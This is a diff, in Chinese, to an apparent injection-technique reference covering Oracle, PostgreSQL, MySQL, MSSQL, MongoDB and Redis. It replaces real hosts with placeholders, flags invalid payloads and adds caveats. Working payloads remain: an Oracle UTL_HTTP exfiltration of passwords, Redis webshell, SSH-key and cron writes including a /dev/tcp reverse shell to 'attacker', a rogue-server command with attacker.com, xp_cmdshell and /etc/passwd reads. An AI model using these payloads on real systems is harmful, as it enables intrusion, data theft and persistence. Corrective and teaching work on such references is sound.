@@ -629,7 +629,7 @@ _Oracle数据库注入基础技术_
 **UTL_HTTP外带**
 > 使用UTL_HTTP外带数据
 ```
-' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)),NULL FROM DUAL--
+' UNION SELECT UTL_HTTP.REQUEST('https://collector.example.invalid/'||(SELECT password FROM users WHERE rownum=1)),NULL FROM DUAL--
 ```
 **语法解析：**
 - `UTL_HTTP.REQUEST()` — 发起HTTP请求 _function_
@@ -676,7 +676,7 @@ _Oracle高级注入技术：Java存储过程、UTL_FILE文件操作_
 **2. 创建Java执行函数**
 > 使用Java执行系统命令
 ```
-' UNION SELECT 1,(SELECT DBMS_JAVA.RUNJAVA('java.lang.Runtime.exec("cmd /c whoami")') FROM DUAL)--
+[无效 Java 源码执行示例：RUNJAVA 接受 Java 启动参数，不直接解释 Runtime.exec 源码；不作为执行证据]
 ```
 **语法解析：**
 - `DBMS_JAVA.RUNJAVA` — 执行Java代码 _value_
@@ -685,7 +685,7 @@ _Oracle高级注入技术：Java存储过程、UTL_FILE文件操作_
 **3. UTL_FILE读取文件**
 > 使用UTL_FILE操作文件
 ```
-' UNION SELECT 1,UTL_FILE.FGETATTR('DATA_PUMP_DIR','/etc/passwd','file_exists') FROM DUAL--
+[无效 SELECT：FGETATTR 是带 OUT 参数的过程；目录对象限制路径，不接受此式任意绝对路径读取]
 ```
 **语法解析：**
 - `UTL_FILE` — Oracle文件操作包 _value_
@@ -697,7 +697,7 @@ _Oracle高级注入技术：Java存储过程、UTL_FILE文件操作_
 > 使用Oracle XMLType、DBMS_PIPE、CASE表达式等特有函数绕过WAF关键字检测
 ```
 ' UNION SELECT 1,XMLType('<root>'||CHR(60)||'data'||CHR(62)||user||'</data></root>') FROM DUAL--
-' UNION SELECT 1,DBMS_PIPE.PACK_MESSAGE(user)||DBMS_PIPE.SEND_MESSAGE('pipe1') FROM DUAL--
+[无效表达式：PACK_MESSAGE 是过程，不能在此 SELECT 中串接调用]
 ' UNION SELECT 1,CASE WHEN (SELECT user FROM DUAL)='SYS' THEN 'admin' ELSE 'user' END FROM DUAL--
 ```
 **语法解析：**
@@ -804,7 +804,8 @@ _platform: linux_
 > 使用COPY写入文件
 _platform: linux_
 ```
-' UNION SELECT 'test',COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/html/shell.php'--
+-- COPY 是独立语句，不是 SELECT 表达式；以下仅为本地合成输出的语法示意：
+COPY (SELECT 'synthetic-canary') TO '/approved-lab/canary.txt';
 ```
 **语法解析：**
 - `COPY` — PostgreSQL COPY命令 _value_
@@ -973,7 +974,8 @@ _NoSQL数据库注入攻击技术_
 **3. 逻辑运算注入**
 > 使用$or逻辑运算
 ```
-{"username": "admin", "password": {"$or": [{"password": "realpass"}, {"1": "1"}]}}
+{"$or": [{"username": "synthetic-user-a"}, {"username": "synthetic-user-b"}]}
+# $or 是顶层逻辑运算符；是否形成注入取决于应用如何接受并拼接此对象。
 ```
 **语法解析：**
 - `$or` — 或运算符 _variable_
@@ -1054,8 +1056,8 @@ _Redis未授权访问和命令注入_
 **1. 探测Redis**
 > 探测Redis服务
 ```
-redis-cli -h target.com ping
-redis-cli -h target.com info
+redis-cli -h target.example.invalid ping
+redis-cli -h target.example.invalid info
 ```
 **语法解析：**
 - `redis-cli` — Redis命令行客户端 _value_
@@ -1065,7 +1067,7 @@ redis-cli -h target.com info
 **2. 未授权访问**
 > 未授权访问Redis
 ```
-redis-cli -h target.com
+redis-cli -h target.example.invalid
 > INFO
 > KEYS *
 > GET sensitive_key
@@ -1078,7 +1080,7 @@ redis-cli -h target.com
 > 写入Webshell
 _platform: linux_
 ```
-redis-cli -h target.com
+redis-cli -h target.example.invalid
 > CONFIG SET dir /var/www/html/
 > CONFIG SET dbfilename shell.php
 > SET shell "<?php system($_GET['cmd']); ?>"
@@ -1093,14 +1095,14 @@ redis-cli -h target.com
 > 写入SSH公钥
 _platform: linux_
 ```
-redis-cli -h target.com
+redis-cli -h target.example.invalid
 > CONFIG SET dir /root/.ssh/
 > CONFIG SET dbfilename authorized_keys
 > SET sshkey "ssh-rsa AAAA..."
 > SAVE
 ```
 **语法解析：**
-- `redis-cli -h target.com` — 第1步操作 _command_
+- `redis-cli -h target.example.invalid` — 第1步操作 _command_
 - `> CONFIG SET dir /root/.ssh/` — 第2步操作 _value_
 - `> CONFIG SET dbfilename authorized_keys` — 第3步操作 _value_
 - `> SET sshkey "ssh-rsa AAAA..."` — 第4步操作 _value_
@@ -1110,7 +1112,7 @@ redis-cli -h target.com
 > 写入Cron任务
 _platform: linux_
 ```
-redis-cli -h target.com
+redis-cli -h target.example.invalid
 > CONFIG SET dir /var/spool/cron/
 > CONFIG SET dbfilename root
 > SET cron "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"
@@ -1125,12 +1127,12 @@ redis-cli -h target.com
 _platform: linux_
 ```
 使用redis-rogue-server工具:
-python redis-rogue-server.py --rhost target.com --lhost attacker.com
+python redis-rogue-server.py --rhost target.example.invalid --lhost attacker.com
 通过主从复制加载恶意模块执行命令
 ```
 **语法解析：**
 - `使用redis-rogue-server工具:` — 第1步操作 _command_
-- `python redis-rogue-server.py --rhost target.com --lhost attacker.com` — 第2步操作 _value_
+- `python redis-rogue-server.py --rhost target.example.invalid --lhost attacker.com` — 第2步操作 _value_
 - `通过主从复制加载恶意模块执行命令` — 第3步操作 _value_
 
 **WAF/EDR 绕过变体：**
@@ -1138,9 +1140,9 @@ python redis-rogue-server.py --rhost target.com --lhost attacker.com
 **Redis命令混淆绕过**
 > 使用引号分割命令字符串、拼接变量等方式混淆Redis命令绕过WAF检测
 ```
-redis-cli -h target.com
-> "C""O""N""F""I""G" SET dir /var/www/html/
-> $(printf 'CONF')$(printf 'IG') SET dbfilename shell.php
+redis-cli -h target.example.invalid
+[无效示例：Redis 协议/交互 CLI 不是 shell，不支持这种 shell 式拼接]
+[无效示例：交互 Redis CLI 不执行 shell 命令替换]
 > SET shell "<?php system(\$_GET['cmd']); ?>"
 > SAVE
 ```
@@ -1151,11 +1153,11 @@ redis-cli -h target.com
 **Redis Lua脚本执行绕过**
 > 通过EVAL执行Lua脚本间接调用Redis命令，绕过对CONFIG/SET等直接命令的检测
 ```
-redis-cli -h target.com
+redis-cli -h target.example.invalid
 > EVAL "redis.call('set','shell','<?php system(\$_GET[c]); ?>')" 0
-> EVAL "redis.call('config','set','dir','/var/www/html/')" 0
-> EVAL "redis.call('config','set','dbfilename','test.php')" 0
-> EVAL "redis.call('save')" 0
+[无效示例：CONFIG 不能从 Redis Lua 脚本调用]
+[无效示例：CONFIG 的脚本限制不能用 EVAL 绕过]
+[无效示例：SAVE 不能从 Redis Lua 脚本调用]
 ```
 **语法解析：**
 - `system()` — 系统命令执行 _function_
@@ -1227,7 +1229,7 @@ _基于布尔条件的SQL盲注技术_
 **4. 使用工具自动化**
 > 使用sqlmap自动化
 ```
-sqlmap -u "http://target.com?id=1" --technique=B --dbs
+sqlmap -u "http://target.example.invalid?id=1" --technique=B --dbs
 使用sqlmap进行布尔盲注
 ```
 **语法解析：**
@@ -1552,7 +1554,7 @@ _存储后触发的SQL注入攻击_
 随后修改密码时SQL变为: UPDATE users SET password='new' WHERE username='admin'/*'
 
 注册用户名: CONCAT(CHAR(39),CHAR(32),CHAR(79),CHAR(82),CHAR(32),CHAR(39),CHAR(49),CHAR(39),CHAR(61),CHAR(39),CHAR(49))
-存储后二次使用时自动解码触发注入
+仅在应用后续显式计算或解码并不安全拼接时可能形成注入；数据库不会自动执行已存储的 CONCAT 文本
 ```
 **语法解析：**
 - `WHERE` — 条件筛选 _keyword_
@@ -1563,7 +1565,7 @@ _存储后触发的SQL注入攻击_
 > 利用Unicode全角字符(U+FF07)标准化、转义序列还原、不同功能模块的过滤差异来绕过WAF检测
 ```
 注册用户名: admin＇ OR ＇1＇=＇1
-(使用全角引号U+FF07，数据库标准化为半角后触发)
+(使用全角引号U+FF07，仅在应用确实进行兼容性标准化后又不安全拼接时可能触发；不是数据库默认行为)
 
 注册邮箱: test@test.com' UNION SELECT password FROM users WHERE '1'='1
 (邮箱验证通过WAF但存储后在其他查询中拼接触发)
@@ -1736,8 +1738,8 @@ _执行多条SQL语句的注入_
 > MySQL执行多语句
 _platform: linux_
 ```
-'; INSERT INTO users(username,password) VALUES('hacker','hacked');--
-'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; SELECT 'synthetic-canary';--
+-- 不通过修改真实账户验证堆叠查询。
 '; SELECT SLEEP(5);--
 > ⚠️ 仅验证堆叠注入存在性，严禁 DROP/TRUNCATE/DELETE
 ```
@@ -1749,7 +1751,7 @@ _platform: linux_
 > MSSQL执行命令
 _platform: windows_
 ```
-'; EXEC xp_cmdshell('whoami');--
+'; EXEC xp_cmdshell 'whoami';--
 '; EXEC sp_executesql N'SELECT * FROM users';--
 ```
 **语法解析：**
@@ -1762,7 +1764,7 @@ _platform: windows_
 > PostgreSQL读取文件
 _platform: linux_
 ```
-'; COPY users FROM '/etc/passwd';--
+-- COPY FROM 会向表追加数据，不是只读文件探测，禁止用于存在性验证。
 '; SELECT * FROM pg_read_file('/etc/passwd');--
 ```
 **语法解析：**
@@ -1804,7 +1806,7 @@ _platform: linux_
 
 **概述：** SQL堆叠查询注入通过分号(;)分隔多条SQL语句，可在一次请求中执行INSERT/UPDATE/DELETE甚至创建存储过程，危害远超普通SELECT注入。
 
-**漏洞原理：** SQL堆叠查询在MSSQL和PostgreSQL中默认支持，MySQL在PHP的mysqli_multi_query()下才支持。该漏洞可执行任意DML/DDL操作：插入管理员账户、修改密码、删除数据、创建后门存储过程甚至执行系统命令。
+**漏洞原理：** SQL堆叠查询在MSSQL和PostgreSQL中默认支持，MySQL 是否支持取决于驱动、协议和多语句配置（mysqli_multi_query 是一个例子）。该漏洞可执行任意DML/DDL操作：插入管理员账户、修改密码、删除数据、创建后门存储过程甚至执行系统命令。
 
 **利用方法：** 堆叠注入利用：1)确认目标支持堆叠查询(;SELECT SLEEP(2)) 2)执行INSERT添加管理员账号 3)执行UPDATE修改现有账户密码 4)MSSQL环境下启用并调用xp_cmdshell执行系统命令 5)PostgreSQL下通过COPY TO写文件。
 
@@ -1922,3 +1924,15 @@ Content-Disposition: form-data; name="id"
 **防御措施：** 部署参数化查询从根本上杜绝SQL注入，WAF仅作为纵深防御层；定期更新WAF规则库；启用WAF的深度解码功能（递归URL解码、Unicode解码）；对异常请求实施速率限制和行为分析；结合RASP技术在运行时检测SQL注入行为
 
 ---
+
+
+## 数据库与证据边界
+
+- MySQL 的 `--` 注释需要后接空白或控制字符；原始 SQL 与 URL 编码片段不可混用。UNION 还要求列数、类型与原查询上下文匹配，错误或 HTTP 200 不是注入证明。
+- `current_user()` 包含账号与主机部分，不能直接与 `mysql.user.User` 相等比较来证明 FILE 权限；权限元数据也未必可读。文件操作另受 FILE、secure_file_priv、操作系统权限和路径限制。不要把安装目录当作网站目录。
+- 写文件、启用日志/扩展过程、UDF、复制配置、持久化、账户修改均是状态变更；不能作为默认存在性验证。只在专门批准的隔离夹具中进行并恢复配置，不能把其他数据库的防御配置直接套用。
+- Redis Lua 不能绕过命令的脚本/ACL限制；配置写入及 RDB 文件不等于有效 PHP/SSH/cron 文件。保护模式、ACL、模块加载限制及运行权限均影响历史攻击链。
+- PostgreSQL 的 COPY 是独立命令；服务端文件访问需要相应角色/权限。SQLite 的 readfile 属于扩展功能，加载 libsqlite3 并不会自动提供它；ATTACH 创建的是数据库文件，不是任意文本输出。
+- MongoDB 必须拒绝预期标量字段中的对象/操作符，固定构造查询并校验类型。$where 受版本和配置限制，不等于任意主机命令执行；使用驱动本身不自动阻止运算符注入。
+- 计时探测需要批准的低次数、对照基线、查询超时和停止条件；BENCHMARK、笛卡尔积和锁等待会消耗服务资源，不能称作无损替代。分块、HPP 或 Content-Type 只有在实际解析差异成立时才有意义。
+- 这里只静态审查语法与适用条件，未验证任何目标、绕过、数据库版本或漏洞；优先使用合成数据与只读 canary，禁止提取真实密码或修改账户。
